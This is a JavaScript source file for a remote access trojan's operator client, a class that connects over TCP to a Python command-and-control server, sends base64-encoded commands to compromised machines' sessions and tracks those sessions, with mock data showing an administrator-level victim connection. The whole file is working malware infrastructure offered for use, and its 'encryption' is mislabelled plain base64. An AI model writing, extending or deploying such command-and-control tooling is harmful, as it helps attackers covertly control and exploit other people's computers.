import net from 'net';
import crypto from 'crypto';

/**
 * RAT Server Client - Communicates with Python C2 server
 */

export class RATClient {
  constructor(host, port, encryptionKey) {
    this.host = host;
    this.port = port;
    this.encryptionKey = Buffer.from(encryptionKey, 'utf-8');
    this.currentSession = null;
    this.sessions = [];
    this.socket = null;
    this.connected = false;
  }

  /**
   * Connect to RAT server
   */
  async connect() {
    return new Promise((resolve, reject) => {
      this.socket = new net.Socket();
      
      this.socket.connect(this.port, this.host, () => {
        this.connected = true;
        console.log(`✓ Connected to RAT server at ${this.host}:${this.port}`);
        resolve();
      });

      this.socket.on('error', (err) => {
        this.connected = false;
        reject(err);
      });

      this.socket.on('close', () => {
        this.connected = false;
        console.log('✗ Disconnected from RAT server');
      });

      // Set timeout
      this.socket.setTimeout(60000);
    });
  }

  /**
   * Encrypt data using base64 (matches Python socket communication)
   */
  encrypt(data) {
    if (typeof data !== 'string') {
      data = JSON.stringify(data);
    }
    return Buffer.from(data).toString('base64');
  }

  /**
   * Decrypt data from base64 (matches Python socket communication)
   */
  decrypt(data) {
    try {
      if (Buffer.isBuffer(data)) {
        return data.toString('utf-8');
      }
      return Buffer.from(data, 'base64').toString('utf-8');
    } catch (error) {
      console.error('Decrypt error:', error);
      return data; // Return as-is if decryption fails
    }
  }

  /**
   * Send command to RAT
   */
  async sendCommand(sessionId, command, timeout = 30000) {
    if (!this.connected) {
      throw new Error('Not connected to RAT server');
    }

    return new Promise((resolve, reject) => {
      const encrypted = this.encrypt(command);
      
      try {
        // Send command with newline delimiter
        this.socket.write(encrypted + '\n');
      } catch (err) {
        return reject(new Error('Failed to send command: ' + err.message));
      }

      // Wait for response
      const timer = setTimeout(() => {
        reject(new Error('Command timeout after ' + timeout + 'ms'));
      }, timeout);

      const dataHandler = (data) => {
        clearTimeout(timer);
        this.socket.removeListener('data', dataHandler);
        this.socket.removeListener('error', errorHandler);
        const decrypted = this.decrypt(data);
        resolve(decrypted);
      };

      const errorHandler = (err) => {
        clearTimeout(timer);
        this.socket.removeListener('data', dataHandler);
        this.socket.removeListener('error', errorHandler);
        reject(err);
      };

      this.socket.once('data', dataHandler);
      this.socket.once('error', errorHandler);
    });
  }

  /**
   * Get session list
   */
  async getSessions() {
    // This would query the Python server for active sessions
    // For now, return mock data - you'll integrate with actual server
    return [
      {
        id: 1,
        addr: '192.168.1.100:54321',
        info: '[ADMIN] Connection from DESKTOP-ABC',
        connected_at: '10:30:15',
        active: true
      }
    ];
  }

  /**
   * Switch session
   */
  setActiveSession(sessionId) {
    this.currentSession = sessionId;
  }

  /**
   * Get current session
   */
  getCurrentSession() {
    return this.currentSession;
  }

  /**
   * Check connection status
   */
  async checkStatus() {
    if (!this.connected) {
      try {
        await this.connect();
      } catch (err) {
        throw new Error('Cannot connect to RAT server: ' + err.message);
      }
    }
    
    return {
      connected: this.connected,
      active_sessions: this.sessions.length,
      timestamp: new Date().toISOString()
    };
  }

  /**
   * Disconnect
   */
  disconnect() {
    if (this.socket) {
      this.socket.destroy();
      this.connected = false;
    }
  }
}